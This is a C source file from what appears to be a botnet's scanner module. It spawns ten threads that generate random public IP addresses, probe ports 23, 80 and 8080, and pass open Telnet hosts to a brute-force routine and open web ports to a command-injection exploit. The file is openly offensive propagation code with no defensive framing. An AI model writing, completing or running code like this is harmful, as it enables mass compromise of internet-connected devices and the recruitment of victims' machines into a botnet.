#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdint.h>

#define SCANNER_THREADS 10 // Number of threads dedicated to scanning

static const int ports_to_scan[] = {23, 80, 8080};
static const int num_ports = sizeof(ports_to_scan) / sizeof(int);

// Checks if an IP address is in a valid, scannable range
static int is_valid_ip(uint32_t ip) {
    struct in_addr addr = { .s_addr = ip };
    char *ip_str = inet_ntoa(addr);

    // Exclude private, loopback, and other non-routable ranges
    if (strncmp(ip_str, "10.", 3) == 0) return 0;
    if (strncmp(ip_str, "172.16.", 7) == 0) return 0; // Simplified check for 172.16.0.0/12
    if (strncmp(ip_str, "192.168.", 8) == 0) return 0;
    if (strncmp(ip_str, "127.", 4) == 0) return 0;
    if (strncmp(ip_str, "0.", 2) == 0) return 0;
    if (strncmp(ip_str, "224.", 4) == 0) return 0; // Multicast

    return 1;
}

// The worker thread function for scanning
void *scanner_worker(void *args) {
    int sock;
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;

    // Seed the random number generator for this thread
    srand(time(NULL) ^ (uintptr_t)pthread_self());

    while (1) {
        // Generate a random public IP
        uint32_t random_ip;
        do {
            random_ip = (uint32_t)rand();
        } while (!is_valid_ip(random_ip));

        target_addr.sin_addr.s_addr = random_ip;

        // Scan multiple ports for each IP
        for (int i = 0; i < num_ports; i++) {
            int port = ports_to_scan[i];
            target_addr.sin_port = htons(port);

            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            struct timeval timeout; 
            timeout.tv_sec = 1; timeout.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

            if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) == 0) {
                struct target t;
                t.addr = target_addr.sin_addr.s_addr;
                t.port = target_addr.sin_port;

                if (port == 23) {
                    printf("[+] Scanner found potential Telnet target: %s\n", inet_ntoa(target_addr.sin_addr));
                    brute_force_add_target(&t);
                } else {
                    printf("[+] Scanner found potential Web target: %s:%d\n", inet_ntoa(target_addr.sin_addr), port);
                    exploit_web_command_injection(&t);
                }
            }
            close(sock);
        }
    }
    return NULL;
}

// Initializes the scanner module
void scanner_init() {
    pthread_t thread_id;
    for (int i = 0; i < SCANNER_THREADS; i++) {
        pthread_create(&thread_id, NULL, scanner_worker, NULL);
    }
    printf("[+] Scanner module initialized with %d threads.\n", SCANNER_THREADS);
}
